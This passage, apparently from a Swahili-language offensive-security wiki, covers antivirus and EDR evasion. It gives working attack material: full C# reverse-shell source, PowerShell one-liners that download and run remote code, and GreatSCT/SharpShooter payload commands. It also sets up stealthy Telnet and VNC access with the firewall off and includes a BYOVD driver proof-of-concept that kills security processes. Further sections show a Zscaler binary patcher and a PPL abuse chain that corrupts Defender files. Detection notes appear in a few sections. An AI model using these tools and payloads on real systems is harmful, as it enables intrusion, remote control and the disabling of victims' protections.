> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute`, ambayo inaweza kutumika kama IOC kufanya triage ya samples moja kwa moja.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la project hii ni kutoa fork ya open-source ya [LLVM](http://www.llvm.org/) compilation suite yenye uwezo wa kutoa usalama mkubwa zaidi wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia tampering.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kutengeneza, wakati wa compilation, code iliyofichwa bila kutumia tool yoyote ya nje na bila kubadilisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza layer ya obfuscated operations zinazotengenezwa na C++ template metaprogramming framework, jambo linalofanya maisha ya mtu anayetaka ku-crack application kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza ku-obfuscate pe files mbalimbali zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni metamorphic code engine rahisi kwa arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa lugha zinazoungwa mkono na LLVM, ikitumia ROP (return-oriented programming). ROPfuscator hu-obfuscate program katika assembly code level kwa kubadilisha regular instructions kuwa ROP chains, hivyo kuzuia uelewa wetu wa kawaida kuhusu normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzi-load

## SmartScreen & MoTW

Huenda umewahi kuona screen hii unapopakua executables fulani kutoka kwenye internet na kuzi-execute.

Microsoft Defender SmartScreen ni security mechanism inayolenga kumlinda end user dhidi ya ku-run applications ambazo zinaweza kuwa malicious.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hufanya kazi hasa kwa kutumia reputation-based approach, ikimaanisha kwamba applications zisizopakuliwa mara nyingi zita-trigger SmartScreen, hivyo kumjulisha na kumzuia end user ku-execute file (ingawa file bado inaweza ku-execute kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier, ambayo huundwa automatically wakati wa kupakua files kutoka internet, pamoja na URL ambayo file lilipakuliwa kutoka humo.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Ku-check Zone.Identifier ADS ya file lililopakuliwa kutoka internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa kwa **trusted** signing certificate **hazita-trigger SmartScreen**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipack ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopack payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hii ni demo ya kubypass SmartScreen kwa kupakia payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu wenye nguvu wa logging katika Windows unaoruhusu applications na system components **ku-log events**. Hata hivyo, unaweza pia kutumiwa na security products kufuatilia na kugundua shughuli hasidi.

Sawa na jinsi AMSI inavyodisable (kubypass), inawezekana pia kufanya function ya **`EtwEventWrite`** ya user space process irudi mara moja bila ku-log events zozote. Hili hufanywa kwa kupatch function hiyo kwenye memory ili irudi mara moja, hivyo kuexclude ETW logging kwa process hiyo.

Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia C# binaries kwenye memory kumekuwa kujulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha post-exploitation tools zako bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuwa na wasiwasi wa kupatch AMSI kwa process nzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zinatoa uwezo wa kuexecute C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuspawn process mpya ya sacrificial**, kuinject post-exploitation malicious code yako kwenye process hiyo mpya, kuexecute malicious code yako, na ikimalizika, ku-kill process hiyo mpya. Hii ina faida na hasara zake. Faida ya method ya fork and run ni kwamba execution hutokea **nje ya** process yetu ya Beacon implant. Hii inamaanisha kwamba ikiwa kitu kitaenda vibaya au kugunduliwa katika post-exploitation action yetu, kuna **uwezekano mkubwa zaidi** wa **implant yetu kuendelea kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Inahusu kuinject post-exploitation malicious code **ndani ya process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuifanya iscanwe na AV, lakini hasara ni kwamba ikiwa kitu kitaenda vibaya wakati wa kuexecute payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako**, kwa kuwa inaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu C# Assembly loading, tafadhali soma makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kutumia Lugha Nyingine za Programming

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kuexecute malicious code kwa kutumia lugha nyingine kwa kuipa machine iliyo-compromise access **kwenye interpreter environment iliyosakinishwa kwenye Attacker Controlled SMB share**.

Kwa kuruhusu access kwenye Interpreter Binaries na environment iliyo kwenye SMB share, unaweza **kuexecute arbitrary code katika lugha hizi ndani ya memory** ya machine iliyo-compromise.

Repo inaeleza: Defender bado inascan scripts, lakini kwa kutumia Go, Java, PHP, n.k. tunakuwa na **flexibility zaidi ya kubypass static signatures**. Testing kwa reverse shell scripts za random, ambazo hazikuwa obfuscated, katika lugha hizi imeonyesha mafanikio.

## TokenStomping

Token stomping ni technique inayomruhusu attacker **kumanipulate access token au security product kama EDR au AV**, na kumwezesha kupunguza privileges zake ili process isife, lakini isiwe na permissions za ku-check shughuli hasidi.

Ili kuzuia hili, Windows inaweza **kuzuia external processes** kupata handles za tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi kudeploy Chrome Remote Desktop kwenye PC ya victim, kisha kuitumia ku-take over na kudumisha persistence:
1. Download kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha bofya MSI file ya Windows ili kudownload MSI file.
2. Run installer silently kwenye victim (admin inahitajika): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard itakuomba uauthorize; bofya kitufe cha Authorize ili kuendelea.
4. Execute parameter uliyopewa ukiwa na adjustments kadhaa: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka pin param inayokuruhusu kuweka pin bila kutumia GUI).


## Advanced Evasion

Evasion ni mada changamano sana; wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry katika system moja tu, hivyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika environments zilizokomaa.

Kila environment unayolenga itakuwa na strengths na weaknesses zake.

Ninakuhimiza sana uangalie talk hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa kuanza kujifunza mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hii pia ni talk nyingine nzuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Techniques za Zamani**

### **Ku-check ni sehemu zipi Defender inapata kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo **itaondoa sehemu za binary** hadi **igundue ni sehemu ipi Defender** inapata kuwa hasidi, kisha ikupatie ikiwa imetenganishwa.\
Tool nyingine inayofanya **kitu hicho hicho ni** [**avred**](https://github.com/dobin/avred), ikiwa na web offering iliyo wazi ya huduma hiyo katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kuisakinisha (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanye **ianze** mfumo unapoanzishwa na **uiendeshe** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha port ya telnet (stealth) na uzime firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Ipakue kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji bin downloads, si setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

- Wezesha chaguo _Disable TrayIcon_
- Weka password katika _VNC Password_
- Weka password katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **UltraVNC.ini** **iliyoundwa hivi karibuni** ndani ya **victim**

#### **Reverse connection**

**attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **VNC connection** ya reverse. Kisha, ndani ya **victim**: Anzisha winvnc daemon `winvnc.exe -run` na utekeleze `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha stealth, hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, vinginevyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). Kagua ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika directory hiyo hiyo, vinginevyo itasababisha [config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa ajili ya help, vinginevyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Ipakue kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anzisha listener** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Defender wa sasa ata-terminate process kwa haraka sana.**

### Ku-compile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

I-compile kwa kutumia:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Itumie pamoja na:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kwa kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kuunda injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuzima AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia console utility ndogo inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kusambaza ransomware. Tool hii huleta **vulnerable lakini *signed* driver yake** na kuitumia vibaya kutekeleza kernel operations zenye privileged access ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.

Mambo muhimu ya kuzingatia
1. **Signed driver**: Faili inayowasilishwa kwenye disk ni `ServiceMouse.sys`, lakini binary hiyo ni driver halali yenye signature ya `AToolsKrnl64.sys` kutoka “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa sababu driver hiyo ina Microsoft signature halali, hupakiwa hata Driver-Signature-Enforcement (DSE) ikiwa enabled.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza husajili driver kama **kernel service**, na wa pili huianzisha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kusitisha process yoyote kwa PID (hutumika kuua huduma za Defender/EDR) |
| `0x990000D0` | Kufuta faili yoyote kwenye disk |
| `0x990001D0` | Ku-unload driver na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Kwa nini inafanya kazi**: BYOVD hupita ulinzi wa user-mode kabisa; code inayotekelezwa kwenye kernel inaweza kufungua *protected* processes, kuzikatisha, au kuchezea kernel objects bila kujali PPL/PP, ELAM au hardening features nyingine.

Detection / Mitigation
•  Enable Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa *kernel* services mpya na toa alert driver inapopakiwa kutoka directory inayoweza kuandikwa na kila mtu au ikiwa haipo kwenye allow-list.
•  Fuatilia user-mode handles zinazoelekea custom device objects zikifuatiwa na `DeviceIoControl` calls zinazotia shaka.

### Kupita Zscaler Client Connector Posture Checks kwa Kurekebisha Binary Zilizo Kwenye Disk

Zscaler’s **Client Connector** hutumia device-posture rules locally na hutegemea Windows RPC kuwasilisha matokeo kwa components nyingine. Chaguo mbili dhaifu za design hufanya full bypass iwezekane:

1. Posture evaluation hufanyika **kabisa client-side** (boolean hutumwa kwa server).
2. Internal RPC endpoints huthibitisha tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kupatch binaries nne zilizosainiwa kwenye disk**, mechanisms zote mbili zinaweza kuzimwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Daima hurudisha `1`, hivyo kila check huwa compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ process yoyote (hata isiyo unsigned) inaweza ku-bind kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Inabadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za awali na kuwasha upya service stack:

* **Ukaguzi wote** wa posture huonyesha **green/compliant**.
* Binaries ambazo hazijasainiwa au zilizorekebishwa zinaweza kufungua endpoints za named-pipe RPC (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathirika hupata ufikiaji usio na vikwazo kwenye internal network iliyofafanuliwa na policies za Zscaler.

Case study hii inaonyesha jinsi maamuzi ya trust yanayofanywa upande wa client pekee na ukaguzi rahisi wa signature yanaweza kushindwa kwa byte patches chache.

## Kutumia Protected Process Light (PPL) Kuharibu AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza hierarchy ya signer/level ili kuhakikisha kuwa ni protected processes zilizo na kiwango sawa au cha juu pekee zinazoweza kuingiliana na nyingine. Kwa mtazamo wa offensive, ikiwa unaweza kuzindua kihalali binary yenye PPL na kudhibiti arguments zake, unaweza kubadilisha functionality isiyo na madhara (kwa mfano, logging) kuwa write primitive yenye vikwazo, inayotumia PPL, dhidi ya protected directories zinazotumiwa na AV/EDR.

Kinachofanya process iendeshe kama PPL
- Target EXE (pamoja na DLLs zozote zilizopakiwa) lazima iwe imesainiwa kwa EKU inayoweza kutumia PPL.
- Process lazima iundwe kwa CreateProcess ikitumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Protection level inayolingana lazima iombwe kulingana na signer wa binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa anti-malware signers, `PROTECTION_LEVEL_WINDOWS` kwa Windows signers). Levels zisizo sahihi zitasababisha creation ishindwe.

Tazama pia utangulizi mpana kuhusu PP/PPL na LSASS protection hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (huchagua protection level na ku-forward arguments kwenye target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Signed system binary `C:\Windows\System32\ClipUp.exe` huji-spawn yenyewe na inakubali parameter ya kuandika log file kwenye path iliyobainishwa na caller.
- Inapozinduliwa kama PPL process, file write hutokea ikiwa na PPL backing.
- ClipUp haiwezi ku-parse paths zilizo na spaces; tumia 8.3 short paths kuelekeza kwenye locations ambazo kwa kawaida zinalindwa.

8.3 short path helpers
- Orodhesha short names: `dir /x` kwenye kila parent directory.
- Pata short path katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Zindua PPL-capable LOLBIN (ClipUp) kwa `CREATE_PROTECTED_PROCESS` ukitumia launcher (kwa mfano, CreateProcessAsPPL).
2) Pitisha ClipUp log-path argument ili kulazimisha file creation katika protected AV directory (kwa mfano, Defender Platform). Tumia 8.3 short names inapohitajika.
3) Ikiwa target binary kwa kawaida huwa imefunguliwa/imefungwa na AV inapokuwa ina-run (kwa mfano, MsMpEng.exe), panga write itokee wakati wa boot kabla AV haijaanza kwa kusakinisha auto-start service ambayo ina-run mapema kwa uhakika. Thibitisha boot ordering kwa Process Monitor (boot logging).
4) Baada ya reboot, PPL-backed write hutokea kabla AV haijafunga binaries zake, na hivyo kuharibu target file na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Maelezo na masharti
- Huwezi kudhibiti maudhui ambayo ClipUp huandika isipokuwa mahali yanapowekwa; primitive hii inafaa zaidi kwa corruption kuliko kuingiza maudhui kwa usahihi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na kuwe na muda wa reboot.
- Timing ni muhimu: target haipaswi kuwa open; execution wakati wa boot huepuka file locks.

Uchunguzi
- Uundaji wa process ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa parent ni launcher isiyo ya kawaida, wakati wa boot.
- Services mpya zilizosanidiwa kuji-start zenye binaries zinazotiliwa shaka na zinazoanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa Defender kuanza.
- File integrity monitoring kwenye binaries za Defender/Platform directories; uundaji/urekebishaji wa files usiotarajiwa na processes zenye protected-process flags.
- ETW/EDR telemetry: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Mitigation
- WDAC/Code Integrity: zuia ni binaries gani zilizosainiwa zinaweza kuendeshwa kama PPL na chini ya parents gani; zuia matumizi ya ClipUp nje ya contexts halali.
- Usimamizi wa services: zuia uundaji/urekebishaji wa auto-start services na fuatilia mabadiliko ya mpangilio wa kuanza.
- Hakikisha Defender tamper protection na early-launch protections zimewezeshwa; chunguza startup errors zinazoashiria corruption ya binary.
- Fikiria kuzima uundaji wa short names za 8.3 kwenye volumes zinazohifadhi security tooling ikiwa inaendana na mazingira yako (fanya majaribio kwa kina).

Marejeo ya PPL na tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
